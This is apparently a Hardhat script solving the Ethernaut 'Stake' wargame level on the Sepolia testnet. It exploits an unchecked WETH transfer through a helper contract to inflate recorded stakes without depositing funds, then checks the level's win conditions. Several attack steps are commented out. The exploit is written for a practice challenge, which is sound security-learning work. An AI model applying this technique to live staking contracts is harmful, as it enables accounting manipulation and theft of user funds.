import { ethers } from "hardhat";

/**
 * Ethernaut Level 31: Stake - Direct EOA Attack with Helper
 * 
 * The vulnerability: StakeWETH doesn't check if the WETH transfer succeeded!
 * We use a helper contract to do a "phantom" WETH stake, then YOUR EOA stakes
 * and unstakes ETH to become a staker with 0 balance.
 * 
 * Usage:
 * STAKE_ADDRESS=0xYourEthernautInstance npx hardhat run scripts/level-31-stake/attack-eoa.ts --network sepolia
 */
async function main() {
  console.log("=== Ethernaut Level 31: Stake - EOA Attack with Helper ===\n");
  
  const stakeAddress = process.env.STAKE_ADDRESS;
  if (!stakeAddress) {
    throw new Error("Please provide STAKE_ADDRESS environment variable");
  }
  
  const [signer] = await ethers.getSigners();
  console.log(`🔑 Your EOA: ${signer.address}\n`);
  
  const stakeContract = await ethers.getContractAt("Stake", stakeAddress);
  const wethAddress = await stakeContract.WETH();
  
  console.log("📋 Contracts:");
  console.log(`   Stake: ${stakeAddress}`);
  console.log(`   WETH: ${wethAddress}`);
  
  // Check initial state
  let totalStaked = await stakeContract.totalStaked();
  let contractBalance = await ethers.provider.getBalance(stakeAddress);
  let userStake = await stakeContract.UserStake(signer.address);
  let isStaker = await stakeContract.Stakers(signer.address);
  
  console.log("\n📊 Initial State:");
  console.log(`   Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
  console.log(`   Contract Balance: ${ethers.formatEther(contractBalance)} ETH`);
  console.log(`   Your Stake: ${ethers.formatEther(userStake)} ETH`);
  console.log(`   Are You Staker: ${isStaker}`);
  
  // Check if already won
  if (contractBalance > 0n && totalStaked > contractBalance && isStaker && userStake === 0n) {
    console.log("\n✅ All conditions already met!");
    return;
  }
  
  const stakeAmount = ethers.parseEther("0.001") + 1n;
  
  console.log("\n🚀 Starting Attack...\n");
  
  // Step 1: Deploy StakeHelper
  console.log("1️⃣  Deploying StakeHelper contract...");
//   const StakeHelper = await ethers.getContractFactory("StakeHelper");
//   const helperDeployment = await StakeHelper.deploy(stakeAddress);
//   await helperDeployment.waitForDeployment();
    const helperAddress = "0x3796B95E9270f427165851d785bc90d9CC1aaD3a"; //await helperDeployment.getAddress();
  console.log(`   Helper deployed at: ${helperAddress}\n`);
  
  const helper = await ethers.getContractAt("StakeHelper", helperAddress) as any;
  
  // Step 2: Helper does phantom WETH stake (increases totalStaked, no ETH added)
  console.log("2️⃣  Helper doing phantom WETH stake...");
  console.log("   (Approves & stakes WETH without having tokens - Stake doesn't check!)");
  
  const phantomAmount = ethers.parseEther("0.002") + 1n; // Larger phantom stake
  const phantomTx = await helper.phantomStake(phantomAmount);
  console.log(`   Tx: ${phantomTx.hash}`);
  await phantomTx.wait();
  console.log("   ✓ Phantom stake done - totalStaked increased!\n");
  
//   // Step 3: Helper stakes REAL ETH (adds ETH to contract balance)
//   console.log("3️⃣  Helper staking real ETH...");
//   console.log(`   Amount: ${ethers.formatEther(stakeAmount)} ETH`);
  
//   const helperStakeTx = await helper.stakeETH({ value: stakeAmount });
//   console.log(`   Tx: ${helperStakeTx.hash}`);
//   await helperStakeTx.wait();
//   console.log("   ✓ Helper staked real ETH\n");
  
//   // Step 4: Helper tries to unstake - FAILS (no receive), ETH stays in Stake!
//   console.log("4️⃣  Helper trying to unstake (will fail, ETH stays in Stake)...");
  
//   const helperUnstakeTx = await helper.tryUnstake();
//   console.log(`   Tx: ${helperUnstakeTx.hash}`);
//   await helperUnstakeTx.wait();
//   console.log("   ✓ Unstake attempted - ETH transfer failed, ETH locked in Stake!\n");
  
  // Check state after helper operations
  totalStaked = await stakeContract.totalStaked();
  contractBalance = await ethers.provider.getBalance(stakeAddress);
  
  console.log("   After helper operations:");
  console.log(`   - Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
  console.log(`   - Contract Balance: ${ethers.formatEther(contractBalance)} ETH`);
  console.log(`   - totalStaked > balance: ${totalStaked > contractBalance ? "YES ✓" : "NO"}`);
  console.log(`   - balance > 0: ${contractBalance > 0n ? "YES ✓" : "NO"}\n`);
  
//   // Step 5: YOUR EOA stakes ETH (to become a staker)
//   console.log("5️⃣  Your EOA staking ETH...");
//   console.log(`   Amount: ${ethers.formatEther(stakeAmount)} ETH`);
  
//   const stakeEthTx = await stakeContract.StakeETH({ value: stakeAmount });
//   console.log(`   Tx: ${stakeEthTx.hash}`);
//   await stakeEthTx.wait();
//   console.log("   ✓ ETH staked under YOUR address\n");
  
//   // Step 6: YOUR EOA unstakes to get balance back to 0
//   console.log("6️⃣  Your EOA unstaking...");
//   userStake = await stakeContract.UserStake(signer.address);
//   console.log(`   Amount: ${ethers.formatEther(userStake)} ETH`);
  
//   const unstakeTx = await stakeContract.Unstake(userStake);
//   console.log(`   Tx: ${unstakeTx.hash}`);
//   await unstakeTx.wait();
//   console.log("   ✓ Unstaked - your balance is now 0\n");
  
  // Check final state
  totalStaked = await stakeContract.totalStaked();
  contractBalance = await ethers.provider.getBalance(stakeAddress);
  userStake = await stakeContract.UserStake(signer.address);
  isStaker = await stakeContract.Stakers(signer.address);
  
  console.log("📊 Final State:");
  console.log(`   Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
  console.log(`   Contract Balance: ${ethers.formatEther(contractBalance)} ETH`);
  console.log(`   Your Stake: ${ethers.formatEther(userStake)} ETH`);
  console.log(`   Are You Staker: ${isStaker}`);
  
  console.log("\n📋 Win Conditions Check:");
  const cond1 = contractBalance > 0n;
  const cond2 = totalStaked > contractBalance;
  const cond3 = isStaker;
  const cond4 = userStake === 0n;
  
  console.log(`   1. Contract balance > 0: ${cond1 ? "✅" : "❌"} (${ethers.formatEther(contractBalance)})`);
  console.log(`   2. totalStaked > balance: ${cond2 ? "✅" : "❌"} (${ethers.formatEther(totalStaked)} > ${ethers.formatEther(contractBalance)})`);
  console.log(`   3. You are a staker: ${cond3 ? "✅" : "❌"}`);
  console.log(`   4. Your stake = 0: ${cond4 ? "✅" : "❌"}`);
  
  if (cond1 && cond2 && cond3 && cond4) {
    console.log("\n🎉 SUCCESS! All conditions met!");
    console.log("   Submit your instance on Ethernaut to pass the level!");
  } else {
    console.log("\n⚠️  Not all conditions met.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
